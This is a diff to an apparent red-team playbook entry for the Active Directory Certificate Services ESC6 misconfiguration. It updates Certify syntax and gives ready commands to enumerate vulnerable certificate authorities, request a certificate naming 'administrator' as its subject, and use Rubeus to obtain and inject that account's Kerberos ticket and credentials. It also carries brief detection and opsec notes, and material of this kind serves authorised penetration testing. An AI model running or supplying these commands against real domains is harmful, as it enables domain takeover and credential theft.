@@ -24,21 +24,21 @@ detection_signal: |
   EDITF_ATTRIBUTESUBJECTALTNAME2.
 usage_examples:
   - description: Identify ESC6 — check if CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag
-    args: "Certify.exe find"
+    args: "Certify.exe enum-cas --filter-vulnerable"
   - description: Exploit ESC6 — request any template with arbitrary SAN
-    args: "Certify.exe request /ca:CASERVER\\\\CA-NAME /template:User /altname:administrator"
+    args: "Certify.exe request --ca CASERVER\\CA-NAME --template User --upn administrator@domain.local"
   - description: Certipy ESC6 detection and exploitation
     args: "certipy find -u user -p pass -dc-ip DC_IP -vulnerable"
 opsec_notes: |
   ESC6 is a CA-level misconfiguration — the flag is set on the Certificate Authority itself
   (not on individual templates). When present, ANY template that allows enrollment becomes
   ESC1-equivalent (any enrolled certificate can include arbitrary SAN). Detection focuses
-  on unusual SANs in certificate requests. Certify's `find` will identify ESC6.
+  on unusual SANs in certificate requests. Use the pinned Certify CA-enumeration verb.
 gotchas: |
   EDITF_ATTRIBUTESUBJECTALTNAME2 is typically only present due to misconfiguration (it's
   not the default). The exploitation is identical to ESC1 — the only difference is that
   the template doesn't need the ENROLLEE_SUPPLIES_SUBJECT flag when the CA has this global
-  flag set. Verify the flag is set using Certify `find` output before attempting this path.
+  flag set. Verify the flag from current-version CA output before attempting this path.
 related_ttps: [certify, certipy, rubeus, adcs-esc8, adcs-esc4]
 alternatives: [adcs-esc1, adcs-esc4]
 common_args: {}
@@ -54,7 +54,7 @@ template effectively ESC1-vulnerable.
 
 ## Identification
 
-Certify `find` output showing ESC6:
+Illustrative legacy ESC6 labels (not observed output from the pinned v2 `enum-cas`):
 ```
 [!] CA Attribute SubjectAltName is set on CA: CASERVER\CA-NAME
 [*] Vulnerable CA flag: EDITF_ATTRIBUTESUBJECTALTNAME2
@@ -63,10 +63,10 @@ Certify `find` output showing ESC6:
 ## Exploitation
 
 Identical to ESC1 — pick any template the current user can enroll in (e.g. `User`),
-add an arbitrary SAN (`/altname:administrator`):
+add an arbitrary UPN SAN:
 
 ```
-Certify.exe request /ca:CASERVER\CA-NAME /template:User /altname:administrator@domain.local
+Certify.exe request --ca CASERVER\CA-NAME --template User --upn administrator@domain.local
 Rubeus.exe asktgt /user:administrator /certificate:<pfx> /getcredentials /show /ptt
 ```
 
